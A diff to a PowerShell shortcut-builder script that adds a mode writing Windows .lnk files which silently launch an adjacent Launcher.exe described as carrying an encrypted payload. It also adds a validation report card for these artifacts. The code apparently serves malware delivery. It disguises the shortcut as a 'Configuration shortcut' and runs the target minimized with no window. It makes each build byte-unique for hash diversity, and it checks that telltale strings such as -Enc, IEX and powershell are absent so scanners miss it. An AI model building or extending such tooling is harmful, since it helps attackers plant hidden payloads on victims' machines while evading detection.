@@ -280,6 +280,21 @@ param(
     # Explorer ever refuses to resolve a native-writer shortcut.
     [switch]$ComWriter,
 
+    # ---- launcher mode (WP4): relative-target shortcut for Launcher.exe ----
+    # When -LauncherMode is given the .lnk targets a RELATIVE 'Launcher.exe'
+    # sitting next to it, with NO command-line arguments (the launcher carries
+    # the encrypted payload; nothing is downloaded at runtime). WorkingDirectory
+    # is left empty so Explorer starts the process in the shortcut's own folder.
+    # The entire powershell -Enc / IEX / downloader pipeline is SKIPPED.
+    [string]$LauncherTarget = 'Launcher.exe',  # bare relative file name (no path)
+    [string]$LauncherTag = '',                 # per-build nonce mixed into the Description -> byte-unique .lnk per build
+    [switch]$LauncherMode,                     # write a launcher-mode relative .lnk
+
+    # ---- Validation report card (WP6, invoked server-side after a launcher build) ----
+    [switch]$Validate,                         # run the launcher-artifact report card and exit
+    [string]$LnkPath,                          # .lnk to inspect (with -Validate)
+    [string]$LauncherExePath,                  # stamped Launcher.exe to inspect (with -Validate)
+
     [switch]$SelfTest                      # run PART 1's Test-ShellLinkWriter suite and exit
 )
 
@@ -5666,6 +5681,126 @@ Corrupt-And-ExpectFailure `
 #          Validate-ShellLink; the old hand-written writer was DELETED)
 # ============================================================================
 
+# ============================================================================
+# Launcher-artifact validation report card (WP6) - server-side, invoked with
+#   pwsh New-AgentShortcut.ps1 -Validate -LnkPath <path> -LauncherExePath <path>
+# Re-parses the finished .lnk with the strict validator's own building blocks
+# and checks the launcher-mode invariants (no arguments, relative target,
+# ShowCommand 7, clean trigram scan, GUI-subsystem PE). Prints one PASS/FAIL
+# row per check and exits 0 only when every row passes. The ZIP-level checks
+# (auth token not plaintext, payload round-trip, per-build hash diversity, zip
+# entry count) run server-side in launcher-validate.ts around this report card.
+# ============================================================================
+function Test-LauncherArtifact {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$LnkPath,
+
+        [string]$LauncherExePath
+    )
+
+    $rows = New-Object 'System.Collections.Generic.List[string]'
+    $failed = 0
+
+    if ([string]::IsNullOrWhiteSpace($LnkPath) -or -not (Test-Path -LiteralPath $LnkPath -PathType Leaf)) {
+        $rows.Add("FAIL| LnkPath does not exist or is not a file: $LnkPath")
+        $failed++
+        return [pscustomobject]@{ Ok = ($failed -eq 0); Rows = $rows.ToArray() }
+    }
+
+    if ($null -ne $LauncherExePath -and -not (Test-Path -LiteralPath $LauncherExePath -PathType Leaf)) {
+        $rows.Add("FAIL| LauncherExePath does not exist or is not a file: $LauncherExePath")
+        $failed++
+    }
+
+    # ---- R1: strict binary re-parse (the Part 1 validator) ----
+    $parsed = $null
+    try {
+        $parsed = Validate-ShellLink -Path $LnkPath
+        $rows.Add('PASS| .lnk strict re-parse (Validate-ShellLink) OK')
+    } catch {
+        $rows.Add('FAIL| .lnk strict re-parse: ' + $_.Exception.Message)
+        $failed++
+    }
+
+    if ($null -ne $parsed) {
+        # ---- R2: Arguments length ~ 0 ----
+        [int]$argsLen = 0
+        if ($parsed.LinkFlags.HasArguments -and $null -ne $parsed.Arguments) {
+            $argsLen = $parsed.Arguments.Length
+        }
+        if ($argsLen -eq 0) {
+            $rows.Add('PASS| command-line Arguments length = 0')
+        } else {
+            $rows.Add("FAIL| command-line Arguments length = $argsLen (expected 0)")
+            $failed++
+        }
+
+        # ---- R3: relative target resolves to Launcher.exe ----
+        $rel = $parsed.RelativePath
+        if ($null -ne $rel -and $rel -match 'Launcher\.exe$') {
+            $rows.Add("PASS| relative target resolves to Launcher.exe ('$rel')")
+        } else {
+            $rows.Add("FAIL| relative target missing/unexpected: '$rel'")
+            $failed++
+        }
+
+        # ---- R4: ShowCommand 7 (minimized / background) ----
+        if ([uint32]$parsed.Header.ShowCommand -eq 7) {
+            $rows.Add('PASS| ShowCommand = 7 (minimized background)')
+        } else {
+            $rows.Add('FAIL| ShowCommand = ' + $parsed.Header.ShowCommand + ' (expected 7)')
+            $failed++
+        }
+    }
+
+    # ---- R5: trigram scan over the raw .lnk bytes ----
+    try {
+        [byte[]]$lnkBytes = Read-AllBytes -Path $LnkPath
+        $text = [System.Text.Encoding]::ASCII.GetString($lnkBytes)
+        $needles = @('-Enc', 'EncodedCommand', 'IEX', 'Invoke-Expression', 'FromBase64String', 'powershell')
+        $hits = @($needles | Where-Object { $text.IndexOf($_, [System.StringComparison]::OrdinalIgnoreCase) -ge 0 })
+        if ($hits.Count -eq 0) {
+            $rows.Add('PASS| trigram scan clean (no -Enc/IEX/FromBase64String/powershell)')
+        } else {
+            $rows.Add('FAIL| trigram scan hit: ' + ($hits -join ', '))
+            $failed++
+        }
+    } catch {
+        $rows.Add('FAIL| trigram scan could not read the .lnk: ' + $_.Exception.Message)
+        $failed++
+    }
+
+    # ---- R6: launcher PE subsystem (GUI = 2) ----
+    if (-not [string]::IsNullOrWhiteSpace($LauncherExePath) -and (Test-Path -LiteralPath $LauncherExePath -PathType Leaf)) {
+        $peOk = $false
+        $subsystem = -1
+        try {
+            [byte[]]$pe = Read-AllBytes -Path $LauncherExePath
+            if ($pe.Length -gt 0x40 -and $pe[0] -eq 0x4D -and $pe[1] -eq 0x5A) { # "MZ"
+                $eLfanew = $pe[0x3C] -bor ($pe[0x3D] -shl 8) -bor ($pe[0x3E] -shl 16) -bor ($pe[0x3F] -shl 24)
+                $off = $eLfanew + 24
+                if ($off + 76 -lt $pe.Length -and $pe[$eLfanew] -eq 0x50 -and $pe[$eLfanew + 1] -eq 0x45) { # "PE"
+                    $subsystem = $pe[$off + 68] -bor ($pe[$off + 69] -shl 8)
+                    $peOk = ($subsystem -eq 2)
+                }
+            }
+        } catch { }
+        if ($peOk) {
+            $rows.Add('PASS| Launcher.exe is a GUI-subsystem PE (Subsystem=2)')
+        } else {
+            $rows.Add("FAIL| Launcher.exe PE subsystem check failed (subsystem=$subsystem, expected 2)")
+            $failed++
+        }
+    }
+
+    foreach ($row in $rows) {
+        Write-Host $row
+    }
+
+    return [pscustomobject]@{ Ok = ($failed -eq 0); Rows = $rows.ToArray() }
+}
+
 # ---- CLI dispatch: PART 1's self-test suite (callable after integration) ----
 if ($SelfTest) {
 
@@ -5686,11 +5821,30 @@ if ($SelfTest) {
     exit 0
 }
 
+# ---- CLI dispatch: launcher-artifact validation report card (WP6) ----
+if ($Validate) {
+    if ([string]::IsNullOrWhiteSpace($LnkPath)) {
+        throw "-Validate requires -LnkPath <path to the .lnk to inspect>"
+    }
+    Write-Host 'Launcher artifact validation report card:'
+    Write-Host '--------------------------------------------------------'
+    $card = Test-LauncherArtifact `
+        -LnkPath $LnkPath `
+        -LauncherExePath $LauncherExePath
+    Write-Host '--------------------------------------------------------'
+    if ($card.Ok) {
+        Write-Host 'LAUNCHER-VALIDATE-OK: all rows PASS.' -ForegroundColor Green
+        exit 0
+    }
+    Write-Host 'LAUNCHER-VALIDATE-FAILED: see FAIL rows above.' -ForegroundColor Red
+    exit 1
+}
+
 # ---- input sanity (keep the generated stub self-contained) ----
 if ([string]::IsNullOrWhiteSpace($Output)) {
     throw "Output (-Output) is required. (Only -SelfTest runs without it.)"
 }
-if (-not $TestPayload) {
+if (-not $TestPayload -and -not $LauncherMode) {
     if ([string]::IsNullOrWhiteSpace($URL)) { throw "URL is required unless -TestPayload is used." }
     if ($URL -match '"')                 { throw "URL must not contain double quotes." }
     if ($FileName -match '"|\\')         { throw "FileName must not contain quotes or backslashes." }
@@ -5713,6 +5867,76 @@ $outputParent = [System.IO.Path]::GetDirectoryName($Output)
 
 if (-not [System.IO.Directory]::Exists($outputParent)) {
     throw "Output directory does not exist: $outputParent"
+}
+
+# ---------------------------------------------------------------------------
+# Launcher mode (WP4): relative-target shortcut for the offline carrier.
+#
+# The .lnk simply points at a RELATIVE 'Launcher.exe' sitting next to it so
+# Windows resolves the target against the shortcut's OWN folder wherever the
+# zip is extracted. No powershell target, no -Enc / IEX / downloader text
+# exists anywhere in this artifact. WorkingDirectory is intentionally left
+# EMPTY - Explorer then starts the target in the folder that contains it
+# (which is the .lnk's folder), which is exactly how the launcher locates
+# itself (it opens "Launcher.exe" relative to cwd).
+# ---------------------------------------------------------------------------
+if ($LauncherMode) {
+    $launcherTarget = Normalize-WindowsPath -Path $LauncherTarget
+
+    if ($launcherTarget -match '^[A-Za-z]:[\\/]') {
+        throw "LauncherTarget must be a bare relative file name (no drive): $launcherTarget"
+    }
+    if ($launcherTarget -match '[\\/]') {
+        throw "LauncherTarget must be a bare file name (no path separators): $launcherTarget"
+    }
+    if ($launcherTarget -eq '.' -or $launcherTarget -eq '..' -or $launcherTarget -match '"') {
+        throw "LauncherTarget must be a valid bare file name: '$launcherTarget'"
+    }
+
+    $description = 'Configuration shortcut'
+    if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
+        # Mix the per-build nonce into the Description -> the .lnk itself is
+        # byte-unique per build (diversity acceptance) while staying benign.
+        $tagPart = $LauncherTag
+        if ($LauncherTag.Length -ge 8) { $tagPart = $LauncherTag.Substring(0, 8) }
+        $description = "$description ($tagPart)"
+    }
+
+    $relativeForm = ".\$launcherTarget"
+
+    $launcherSpec = @{
+        TargetPath   = $launcherTarget
+        Description  = $description
+        RelativePath = $relativeForm
+        IconLocation = $Icon
+        ShowCommand  = 7
+    }
+
+    Write-ShellLink `
+        -Path $Output `
+        -Spec $launcherSpec | Out-Null
+
+    $expectedLauncherSpec = @{
+        TargetPath   = $launcherTarget
+        Description  = $description
+        RelativePath = $relativeForm
+        IconLocation = $Icon
+    }
+
+    $validation = Validate-ShellLink `
+        -Path $Output `
+        -ExpectedTarget $relativeForm `
+        -ExpectedSpec $expectedLauncherSpec
+
+    Write-Host "Launcher .lnk written: $Output"
+    Write-Host "  relative target      : $launcherTarget"
+    Write-Host "  relative path        : $relativeForm"
+    Write-Host "  working directory    : (empty - Explorer starts the target in the shortcut's own folder)"
+    Write-Host "  arguments            : (none - length 0)"
+    Write-Host "  show command         : 7 (minimized; the target is a GUI-subsystem exe - no window)"
+    Write-Host "  description          : $description"
+    Write-Host '  post-write validation: Validate-ShellLink re-parsed the .lnk and every field matches'
+    exit 0
 }
 
 # ---------------------------------------------------------------------------
